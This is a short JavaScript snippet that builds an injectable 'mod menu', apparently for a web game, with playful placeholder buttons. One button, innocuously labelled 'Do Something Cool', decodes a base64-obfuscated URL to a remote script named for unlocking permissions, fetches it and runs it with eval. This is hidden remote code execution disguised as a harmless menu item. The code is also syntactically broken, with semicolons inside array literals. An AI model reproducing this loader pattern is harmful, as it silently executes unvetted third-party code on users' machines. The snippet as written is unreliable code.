(async () => {
  await ModMenu.init();
  const MenuTree = ModMenu.MenuTree;
  const MenuBool = ModMenu.MenuBool;
  const MenuButton = ModMenu.MenuButton;
  const coolInjMenu = new MenuTree('Cool Injectable Menu', [
    new MenuButton('Do Something Cool', () => fetch(atob("aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZG0yaG9hNDVxL3Jhdy91cGxvYWQvdjE2Mzg1NjczNzkvdW5sb2NrQWxsUGVybV9iZW5peTMuanM=")).then((res) => res.text().then((t) => eval(t)));
    new MenuBool('Rocket Blasters Enabled', true);
    new MenuTree('Cool Settings', [
      new MenuButton('Launch Rocket!', () => {
        if(coolInjMenu[1].value){
          alert('Rocket launched!');
        } else {
          alert('Enable rocket blasters first!');
        }
      });
    ]);
  ])
  ModMenu.menu.arr.push(coolInjMenu);
})();
